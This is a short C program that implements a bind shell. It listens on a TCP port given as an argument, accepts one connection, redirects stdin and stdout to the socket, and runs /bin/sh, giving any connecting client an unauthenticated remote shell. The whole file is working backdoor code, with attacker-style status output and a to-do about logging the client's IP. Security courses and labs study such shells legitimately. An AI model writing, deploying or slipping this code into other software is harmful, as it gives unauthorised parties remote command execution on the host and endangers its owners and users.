#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdlib.h>

/* TO-DO:
 * 1. Print out client's IP address
*/

int main(int argc, char **argv) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <port>\n", argv[0]);
        return 1;
    }

    int fd1, fd2, retval;
    struct sockaddr_in server;

    fd1 = socket(AF_INET, SOCK_STREAM, 0);

    if (fd1 == -1) {
        fprintf(stderr, "Socket creation failed.\n");
        return -1;
    }
    
    server.sin_family = AF_INET;
    server.sin_port = htons(atoi(argv[1]));
    server.sin_addr.s_addr = INADDR_ANY;

    retval = bind(fd1, (struct sockaddr *) &server, sizeof(server));

    if (retval == -1) {
        fprintf(stderr, "Socket bind failed.\n");
        return -1;
    }

    printf("[*] Socket binded to port %s\n", argv[1]);

    listen(fd1, 0);

    puts("[*] Listening for connections...\n");
    fd2 = accept(fd1, 0, 0);

    if (fd2 == -1) {
        fprintf(stderr, "Accepting new connection failed.\n");
        return -1;
    }

    for (int fd = 0; fd < 2; fd++)
        dup2(fd2, fd);

    execve("/bin/sh", 0, 0);

    return 0;
}
